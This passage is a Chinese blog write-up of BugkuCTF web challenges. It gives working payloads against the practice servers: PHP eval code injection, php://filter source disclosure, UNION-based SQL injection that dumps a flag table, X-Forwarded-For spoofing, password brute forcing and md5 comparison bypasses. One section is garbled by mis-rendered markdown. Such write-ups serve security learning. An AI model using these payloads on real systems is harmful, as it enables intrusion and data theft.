<html>
<head>
	
	<title>BugkuCTF-WEB-WriteUp</title>
	<meta name="keywords" content="Curtails的blog" />

    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

    
	   <link href="/css/main.css?v=3" rel="stylesheet" type="text/css" />
    
        <script src="/js/util.js"></script>
        <script>
            if(isMobile()) {
                loadjscssfile('../css/mobile.css', 'css');
            } else {
                loadjscssfile('../css/desktop.css', 'css');
            }
        </script> 
    

    <link rel="alternate" type="application/atom+xml" href="/atom.xml" title="Atom feed">

    
	<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=3"/>
    
    

</head>

<body>


<h2 class="title">BugkuCTF-WEB-WriteUp</h2>
<!---
<div style="text-align:center;margin-top: -10px;">
<div class="article-category">
发表于2019年5月5日




 </div>
--->
</div>

<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web2"><span class="toc-text">Web2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#计算器"><span class="toc-text">计算器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web基础-GET"><span class="toc-text">web基础$_GET</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web基础-POST"><span class="toc-text">web基础$_POST</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#矛盾"><span class="toc-text">矛盾</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web3"><span class="toc-text">web3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#域名解析"><span class="toc-text">域名解析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#你必须让他停下"><span class="toc-text">你必须让他停下</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#本地包含"><span class="toc-text">本地包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#变量1"><span class="toc-text">变量1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag在index里"><span class="toc-text">flag在index里</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#输入密码查看flag"><span class="toc-text">输入密码查看flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#点击一百万次"><span class="toc-text">点击一百万次</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#备份是个好习惯"><span class="toc-text">备份是个好习惯</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#成绩单查询"><span class="toc-text">成绩单查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#秋名山老司机"><span class="toc-text">秋名山老司机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#速度要快"><span class="toc-text">速度要快</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cookies欺骗"><span class="toc-text">cookies欺骗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#never-give-up"><span class="toc-text">never give up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#welcome-to-bugkuctf"><span class="toc-text">welcome to bugkuctf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过狗一句话"><span class="toc-text">过狗一句话</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#字符？正则？"><span class="toc-text">字符？正则？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#前女友-SKCTF"><span class="toc-text">前女友(SKCTF)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#login1-SKCTF"><span class="toc-text">login1(SKCTF)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#你从哪里来"><span class="toc-text">你从哪里来</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#md5-collision-NUPT-CTF"><span class="toc-text">md5 collision(NUPT_CTF)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#程序员本地网站"><span class="toc-text">程序员本地网站</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#各种绕过"><span class="toc-text">各种绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web8"><span class="toc-text">web8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#细心"><span class="toc-text">细心</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#求getshell"><span class="toc-text">求getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#INSERT-INTO注入"><span class="toc-text">INSERT INTO注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#这是一个神奇的登陆框"><span class="toc-text">这是一个神奇的登陆框</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#多次"><span class="toc-text">多次</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-encrypt-1-ISCCCTF"><span class="toc-text">PHP_encrypt_1(ISCCCTF)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件包含2"><span class="toc-text">文件包含2</span></a></li></ol>
<p>BugkuCTF-WEB-WriteUp</p>
<h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><p><img src="http://imglf4.nosdn0.126.net/img/SmlBNVNYWEwrN0c3a0JLS2VlS1l3ZnZsTS9jTEdtMFJHNkZBbTBZaXFjWG50ang0WUIzZi9RPT0.png?imageView&thumbnail=1680x0&quality=96&stripmeta=0" alt=""></p>
<ul>
<li><p>解题</p>
</li>
<li><p>打开网站如下（一片滑稽）</p>
<p><img src="http://imglf5.nosdn0.126.net/img/SmlBNVNYWEwrN0c3a0JLS2VlS1l3VjhGVDdVYnhlTy9jNDhLcXVENjB3bWlTTXBiNW1ZU3FRPT0.png?imageView&thumbnail=1920y1030&type=png&quality=96&stripmeta=0" alt=""></p>
</li>
<li><p>查看源代码</p>
<p><img src="http://imglf6.nosdn0.126.net/img/SmlBNVNYWEwrN0c3a0JLS2VlS1l3VUljRWp6Ym4za0dpR29MYXlVbFgyZWt3U2ZlV2h6MldRPT0.png?imageView&thumbnail=1680x0&quality=96&stripmeta=0" alt=""></p>
</li>
<li><p>得到flag</p>
</li>
<li><p>Flag<br>KEY{Web-2-bugKssNNikls9100}</p>
</li>
</ul>
<h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><p><img src="http://imglf5.nosdn0.126.net/img/SmlBNVNYWEwrN0c3a0JLS2VlS1l3WFkwODhVTTd6VTdkdjRFeVRuZlZ1MTdTQVQ0QmYwQjBRPT0.png?imageView&thumbnail=1680x0&quality=96&stripmeta=0" alt=""></p>
<ul>
<li><p>解题</p>
</li>
<li><p>打开网址输入结果，发现只能输入一位数字</p>
<p><img src="http://imglf3.nosdn0.126.net/img/SmlBNVNYWEwrN0c3a0JLS2VlS1l3WDhFMGU3OGdWNktDMUV6L256N1RCYUJLWHExTWhYNE1RPT0.png?imageView&thumbnail=1680x0&quality=96&stripmeta=0" alt=""></p>
</li>
<li><p>查看元素找到maxlength</p>
<p><img src="http://imglf3.nosdn0.126.net/img/SmlBNVNYWEwrN0c3a0JLS2VlS1l3YnZHVjRCUWxHYW9DVHZ5L2taNWpiZDhvSWNFblJ4N2ZRPT0.png?imageView&thumbnail=1680x0&quality=96&stripmeta=0" alt=""></p>
</li>
<li><p>修改maxlength = 3</p>
</li>
<li><p>输入正确答案</p>
<p><img src="http://imglf6.nosdn0.126.net/img/SmlBNVNYWEwrN0c3a0JLS2VlS1l3U01MM0NGQU4xczMxdWtoU1FGM04vblhnN0c3T0lvZlVBPT0.png?imageView&thumbnail=1920y392&type=png&quality=96&stripmeta=0" alt=""></p>
</li>
<li><p>Flag<br>flag{CTF-bugku-0032}</p>
</li>
</ul>
<h2 id="web基础-GET"><a href="#web基础-GET" class="headerlink" title="web基础$_GET"></a>web基础$_GET</h2><p><img src="http://imglf3.nosdn0.126.net/img/SmlBNVNYWEwrN0Y5STBMcTkwdUYrUnFWUm8wZkROVnNiUURDQ2xLQ3Jrc2QxSDlRN0luOWRBPT0.png?imageView&thumbnail=1680x0&quality=96&stripmeta=0" alt=""></p>
<ul>
<li><p>解题</p>
</li>
<li><p>打开网址<br><img src="http://imglf4.nosdn0.126.net/img/SmlBNVNYWEwrN0Y5STBMcTkwdUYrY3kwcHhlNHk5NTRZaHFzbGl1RkZleml2bDhnNGtNdlJ3PT0.png?imageView&thumbnail=500x0&quality=96&stripmeta=0" alt=""></p>
</li>
<li><p>通过阅读代码得知用get提交数据即可</p>
</li>
<li><p>地址加?what=flag</p>
</li>
<li><p>打开修改后的网址</p>
<p><img src="http://imglf6.nosdn0.126.net/img/SmlBNVNYWEwrN0Y5STBMcTkwdUYrZmVLRnhnSnlSaGxWd29ubXdKeVFKM0hTTVo4d2hMWGJ3PT0.png?imageView&thumbnail=1680x0&quality=96&stripmeta=0" alt=""></p>
</li>
<li><p>Flag<br>flag{bugku_get_su8kej2en}</p>
</li>
<li><p>相关知识</p>
</li>
<li><p>$_GET </p>
<blockquote>
<p>1、预定义的 $_GET 变量用于收集来自 method=“get” 的表单中的值。</p>
<p>2、 从带有 GET 方法的表单发送的信息，对任何人都是可见的（会显示在浏览器的地址栏），并且对发送信息的量也有限制。</p>
</blockquote>
</li>
<li><p>$_POST</p>
<blockquote>
<p>1、预定义的 $_POST 变量用于收集来自 method=“post” 的表单中的值。</p>
<p>2、从带有 POST 方法的表单发送的信息，对任何人都是不可见的（不会显示在浏览器的地址栏），并且对发送信息的量也没有限制。</p>
</blockquote>
</li>
</ul>
<h2 id="web基础-POST"><a href="#web基础-POST" class="headerlink" title="web基础$_POST"></a>web基础$_POST</h2><p><img src="http://imglf6.nosdn0.126.net/img/SmlBNVNYWEwrN0Y5STBMcTkwdUYrZldCaWlscVNzUFA2OXlsOFU4RTlaZzdzOWZ0cTYxQzdRPT0.png?imageView&thumbnail=1680x0&quality=96&stripmeta=0" alt=""></p>
<ul>
<li><p>解题</p>
</li>
<li><p>打开网址</p>
<p><img src="http://imglf3.nosdn0.126.net/img/SmlBNVNYWEwrN0Y5STBMcTkwdUYrY3pXcURLdzVkQmlFWWxJMGRjbVg0TUtpVXlSbmxZWG1BPT0.png?imageView&thumbnail=1680x0&quality=96&stripmeta=0" alt=""></p>
</li>
<li><p>阅读可知通过post提交数据</p>
</li>
<li><p>使用Firefox扩展hackbar；填写url；填写post_data为what=flag；execute</p>
<p><img src="http://imglf3.nosdn0.126.net/img/SmlBNVNYWEwrN0Y5STBMcTkwdUYrVndVcDNUQ1VRNnNoQnpVb0NRaDJEcll4UFNUTXdXL2p3PT0.png?imageView&thumbnail=1680x0&quality=96&stripmeta=0" alt=""></p>
</li>
<li><p>execute后</p>
<p><img src="http://imglf5.nosdn0.126.net/img/SmlBNVNYWEwrN0Y5STBMcTkwdUYrUkljTVpVUEo5VHZaNmtwQWowNnVoREN0WW5jODlsODBBPT0.png?imageView&thumbnail=1680x0&quality=96&stripmeta=0" alt=""></p>
</li>
<li><p>或者bp抓包 改变请求方式 空一行加上<code>what=flag</code> -foward 网页会显示flag</p>
</li>
<li><p>Flag<br>flag{bugku_get_ssseint67se}</p>
</li>
</ul>
<h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><p><img src="http://imglf4.nosdn0.126.net/img/SmlBNVNYWEwrN0Y5STBMcTkwdUYrUThLWko4bnBNc2xkQkQ4ZU5haUhPNXlTOVU2S2VwQXFBPT0.png?imageView&thumbnail=1680x0&quality=96&stripmeta=0" alt=""></p>
<ul>
<li><p>解题</p>
</li>
<li><p>打开网址</p>
<p><img src="http://imglf3.nosdn0.126.net/img/SmlBNVNYWEwrN0Y5STBMcTkwdUYrUjBGN0tGcktDT1pmVzBMR1dPMXFabStHVU5wOFdsVWp3PT0.png?imageView&thumbnail=1680x0&quality=96&stripmeta=0" alt=""></p>
</li>
<li><p>阅读可得知数据用get传参</p>
</li>
<li><p>有两个条件判断，当num不是数字或数字串(not numeric)同时num等于1时 返回flag，此为矛盾。</p>
</li>
<li><p>“==”有数据类型转换，所以num取1xxx格式任意由1和字母组成的串即可。</p>
</li>
<li><p>修改地址</p>
<p><img src="http://imglf6.nosdn0.126.net/img/SmlBNVNYWEwrN0Y5STBMcTkwdUYrYkhLeGQwemZNU2NOTkY2dlg1MXFJcW13bnFyczZZSHR3PT0.png?imageView&thumbnail=1680x0&quality=96&stripmeta=0" alt=""></p>
</li>
<li><p>Flag<br>flag{bugku-789-ps-ssdf}</p>
</li>
</ul>
<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>循环弹窗</p>
<ul>
<li>阻止此页面创建更多对话框</li>
<li>看下源码 发现<code>&lt;!--&gt;</code>注释含有&amp; # 数字组成字符串为html编码</li>
<li>解码得flag</li>
<li>KEY{J2sa42ahJK-HS11III}</li>
</ul>
<h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><p>题目：听说把 flag.baidu.com 解析到123.206.87.240 就能拿到flag</p>
<ul>
<li>把<code>123.206.87.240 flag.baidu.com</code>加入host文件中</li>
<li>访问flag.baidu.com即可</li>
<li>KEY{DSAHDSJ82HDS2211}</li>
</ul>
<h2 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h2><p>页面不断地跳</p>
<ul>
<li>看源代码发现是js脚本不断刷新<ul>
<li>burpsuite_pro抓包分析 send to repeater逐个go</li>
</ul>
</li>
<li>或者干脆禁用js 参考相应浏览器设置</li>
<li>flag{dummy_game_1s_s0_popular}</li>
</ul>
<h2 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h2><p>看题目猜测有本地包含漏洞</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">" var_dump( $a );"</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>首先包含了flag.php 其次获取helle值 其次打印了变量相关信息</li>
<li>通过hello值构造payload打印flag.php代码<code>?hello=1);show_source(&#39;flag.php&#39;);var_dump(3</code></li>
<li>或者<code>?hello= 1);print_r(file(&quot;./flag.php%22&quot;)</code></li>
<li>看到flag</li>
<li>flag{bug-ctf-gg-99}</li>
</ul>
<h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><p>提示我们flag In the variable ! 看到$$args 想到全局变量GLOBALS</p>
<ul>
<li>```php<?php  
error_reporting(0);
include "flag1.php";
highlight_file(__file__);
if(isset($_GET['args'])){
  $args = $_GET['args'];
  if(!preg_match("/^\w+$/",$args)){
      die("args error!");
  }
    eval("var_dump($$args);");
}
?>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">  阅读得知`preg_match(&quot;/^\w+$/&quot;,$args)`输入args得满足此正则表达式</span><br><span class="line">- 构造payload输出GLOBALS内容`?args=GLOBALS`</span><br><span class="line">- flag&#123;92853051ab894a64f7865cf3c2128b34&#125;</span><br><span class="line"></span><br><span class="line">## web5</span><br><span class="line">hint：JSPFUCK??????答案格式CTF&#123;**&#125;</span><br><span class="line">- 看下源码含有`[][(![]+[])[+[]]+([![]]+[][[]])...`</span><br><span class="line">- 把此代码丢进console运行</span><br><span class="line">- ctf&#123;whatfk&#125;&quot;</span><br><span class="line"></span><br><span class="line">## 头等舱</span><br><span class="line">连接是以hd.php结尾 hint：hidden提示</span><br><span class="line">- 源码啥也没有抓个包</span><br><span class="line">- 在response-raw中看到了flag</span><br><span class="line">- flag&#123;Bugku_k8_23s_istra&#125;</span><br><span class="line"></span><br><span class="line">## 网站被黑</span><br><span class="line">一个被黑的网页 hint：链接以webshell结尾</span><br><span class="line">- 用脚本扫一下看到`http://123.206.87.240:8002/webshell/shell.php`</span><br><span class="line">- 登录页面有密码 抓包爆破一下</span><br><span class="line">- 得到密码hack登录</span><br><span class="line">- flag&#123;hack_bug_ku035&#125; </span><br><span class="line"></span><br><span class="line">## 管理员系统</span><br><span class="line">随便输入账号密码提示：IP禁止访问，请联系本地管理员登陆，IP已被记录. </span><br><span class="line">hint：本地管理员</span><br><span class="line">- 查看源码有注释base64竟然在最底下中间空了很大空白</span><br><span class="line">- 解码得test123</span><br><span class="line">- &lt;mark&gt;X-Forwarded-For&lt;/mark&gt;</span><br><span class="line">- 伪造xff头`X-Forwarded-For: 127.0.0.1`添加到raw中</span><br><span class="line">- go raw中出现flag</span><br><span class="line">- The flag is: 85ff2ee4171396724bae20c0bd851f6b</span><br><span class="line"></span><br><span class="line">## web4</span><br><span class="line">hint：看看源代码</span><br><span class="line">- 查看源码两个变量p1 p2是由% 数字组成的字符串 还有额外类似字符串代码提示unescape 为escape编码</span><br><span class="line">- 解码按照代码提示合并得</span><br><span class="line">  ```php</span><br><span class="line">  function checksubmit()&#123;</span><br><span class="line">    var a=document.getelementbyid(&quot;password&quot;);</span><br><span class="line">    if(&quot;undefined&quot;!=typeof a)&#123;</span><br><span class="line">      if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;==a.value)</span><br><span class="line">        return!0;</span><br><span class="line">      alert(&quot;error&quot;);</span><br><span class="line">      a.focus(); </span><br><span class="line">      return!1</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      document.getelementbyid(&quot;levelquest&quot;).onsubmit=checksubmit;</span><br></pre></td></tr></table></figure></li>
<li>代码意思大致是password=67d709b2b54aa2aa648cf6e87a7114f1</li>
<li>输入字符串</li>
<li>KEY{J22JK-HS11}</li>
</ul>
<h2 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h2><p>标题提示index 看下源码没提示 猜测index.php里flag</p>
<ul>
<li>文件包含漏洞 利用php://filter读取base64编码源码后的代码</li>
<li>构造payload<code>index.php?file=php://filter/convert.base64-encode/resource=index.php</code></li>
<li>解码阅读源码看到flag</li>
<li>flag{edulcni_elif_lacol_si_siht}</li>
</ul>
<h2 id="输入密码查看flag"><a href="#输入密码查看flag" class="headerlink" title="输入密码查看flag"></a>输入密码查看flag</h2><p>url=<a href="http://123.206.87.240:8002/baopo/" target="_blank" rel="noopener">http://123.206.87.240:8002/baopo/</a> hint：爆破<br>密码五位数</p>
<ul>
<li>密码13579 登录</li>
<li>baopo好慢..</li>
<li>flag{bugku-baopo-hah} </li>
</ul>
<h2 id="点击一百万次"><a href="#点击一百万次" class="headerlink" title="点击一百万次"></a>点击一百万次</h2><p>打开好像让我们点击一百万次</p>
<ul>
<li>看源码js确实从0开始 修改变量初始值为999999</li>
<li>用harkbar修改clicks=1000001</li>
<li>flag{bugku-baopo-hah} </li>
</ul>
<h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p>打开网址 得hex代码 转换成ASCII失败 应该不是hex<br>hint：备份</p>
<ul>
<li>用py扫一下目录得到 <a href="http://123.206.87.240:8002/web16/index.php.bak" target="_blank" rel="noopener">http://123.206.87.240:8002/web16/index.php.bak</a></li>
<li>下载打开</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strstr($_SERVER[<span class="string">'REQUEST_URI'</span>], <span class="string">'?'</span>);</span><br><span class="line">$str = substr($str,<span class="number">1</span>);</span><br><span class="line">$str = str_replace(<span class="string">'key'</span>,<span class="string">''</span>,$str);</span><br><span class="line">parse_str($str);</span><br><span class="line"><span class="keyword">echo</span> md5($key1);  </span><br><span class="line"><span class="keyword">echo</span> md5($key2);</span><br><span class="line"><span class="keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span><br><span class="line">  <span class="keyword">echo</span> $flag.<span class="string">"取得flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>大致意思是读取url参数并且把字符key去掉<code>md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2</code>条件满足后输出flag</li>
<li>kekeyy代替key</li>
<li>第一个方法<ul>
<li>mad无法处理数组 默认返回null</li>
<li><code>?kekeyy[]=something&amp;kekeyy[]=anything</code></li>
</ul>
</li>
<li>第二个方法：<br>两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的<br>所以找出加密后0e开头的字符串<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br></pre></td></tr></table></figure>
<ul>
<li><code>?kekeyy1=240610708&amp;kekeyy2=QNKCDZO</code></li>
</ul>
</li>
<li>Bugku{OH_YOU_FIND_MY_MOMY}</li>
</ul>
<h2 id="成绩单查询"><a href="#成绩单查询" class="headerlink" title="成绩单查询"></a>成绩单查询</h2><p>标准sql注入题</p>
<ul>
<li>hackbar注入<code>id=1&#39;#</code> 成功</li>
<li>判断列数<code>id=1&#39; order by 4#</code>四列，五列测试不对</li>
<li>联合查询<code>id=0&#39; union select 1,2,3,4#</code>z成功</li>
<li>查询<code>id=0&#39; union select 1,database(),user(),version()#</code></li>
<li>看到数据库名称含有flag<br><code>skctf_flag      skctf_flag@localhost      5.5.34-log</code></li>
<li>查询表名 <code>id=0&#39; union select 1,2,3,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;skctf_flag&#39;)#</code>得到表名fl4g</li>
<li>查询表的列名<code>id=0&#39;union select 1,2,3,(select group_concat(column_name)
from information_schema.columns where table_name=&#39;fl4g&#39;)#</code>得出列skctf_flag</li>
<li>查询数据<code>id=0&#39; union select 1,2,3,(select skctf_flag from fl4g)#</code></li>
<li>BUGKU{Sql_INJECT0N_4813drd8hz4}</li>
</ul>
<h2 id="秋名山老司机"><a href="#秋名山老司机" class="headerlink" title="秋名山老司机"></a>秋名山老司机</h2><p>题目：亲请在2s内计算老司机的车速是多少<br>1453188555<em>112050552</em>2035911046+129564843-990655641<em>10801555</em>1826101406-742934982+1688885834-387627083+502307721=?;<br>车速太快人不行了 借助py</p>
<ul>
<li>看看前辈 <a href="https://www.jianshu.com/p/b0a5d72c8bae" target="_blank" rel="noopener">https://www.jianshu.com/p/b0a5d72c8bae</a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#改一下url</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/qiumingshan/'</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">source = s.get(url)</span><br><span class="line">expression = re.search(<span class="string">r'(\d+[+\-*])+(\d+)'</span>, source.text).group()</span><br><span class="line">result = eval(expression)</span><br><span class="line">post = &#123;<span class="string">'value'</span>: result&#125;</span><br><span class="line">print(s.post(url, data = post).text)</span><br></pre></td></tr></table></figure></li>
<li>跑了好几次</li>
<li>Bugku{YOU_DID_IT_BY_SECOND}</li>
</ul>
<h2 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h2><p>打开网页：我感觉你得快点!!!</p>
<ul>
<li>看源码有注释</li>
<li>抓包看一下raw中有base64 解码后验证不是flag</li>
<li>每一次go base64都不一样</li>
<li>写脚本<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://123.206.87.240:8002/web6/'</span></span><br><span class="line">s=requests.Session()</span><br><span class="line">header=s.get(url).headers</span><br><span class="line"><span class="comment">#print(header)</span></span><br><span class="line">flag = base64.b64decode(base64.b64decode(header[<span class="string">'flag'</span>]).decode() .split(<span class="string">':'</span>)[<span class="number">1</span>]).decode() <span class="comment">#对其进行base64两次解密</span></span><br><span class="line"></span><br><span class="line">data=&#123;<span class="string">'margin'</span>:flag&#125;</span><br><span class="line"></span><br><span class="line">print(s.post(url=url,data=data).content.decode())</span><br></pre></td></tr></table></figure></li>
<li>KEY{111dd62fcd377076be18a}</li>
</ul>
<h2 id="cookies欺骗"><a href="#cookies欺骗" class="headerlink" title="cookies欺骗"></a>cookies欺骗</h2><p>打开网址 url=<a href="http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=" target="_blank" rel="noopener">http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=</a></p>
<ul>
<li>好像有base64 解码得<code>keys.txt</code></li>
<li>尝试用filename访问index.php（原url使用base64，这也将index.php进行编码<code>aW5kZXgucGhw</code></li>
<li>构造 <a href="http://123.206.87.240:8002/web11/index.php?line=1&amp;filename=aW5kZXgucGhw" target="_blank" rel="noopener">http://123.206.87.240:8002/web11/index.php?line=1&amp;filename=aW5kZXgucGhw</a></li>
<li>显示信息切换行数都有 写脚本获取全部代码<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">a=<span class="number">30</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(a):</span><br><span class="line">    url=<span class="string">"http://123.206.87.240:8002/web11/index.php?line="</span>+str(i)+<span class="string">"&amp;filename=aW5kZXgucGhw"</span> </span><br><span class="line">    s=requests.get(url)</span><br><span class="line">    <span class="keyword">print</span> s.text</span><br></pre></td></tr></table></figure>
得到源代码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])?$_GET[<span class="string">'filename'</span>]:<span class="string">""</span>);</span><br><span class="line">$line=<span class="keyword">isset</span>($_GET[<span class="string">'line'</span>])?intval($_GET[<span class="string">'line'</span>]):<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>($file==<span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>);</span><br><span class="line">$file_list = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'0'</span> =&gt;<span class="string">'keys.txt'</span>,</span><br><span class="line"><span class="string">'1'</span> =&gt;<span class="string">'index.php'</span>,</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'margin'</span>]) &amp;&amp; $_COOKIE[<span class="string">'margin'</span>]==<span 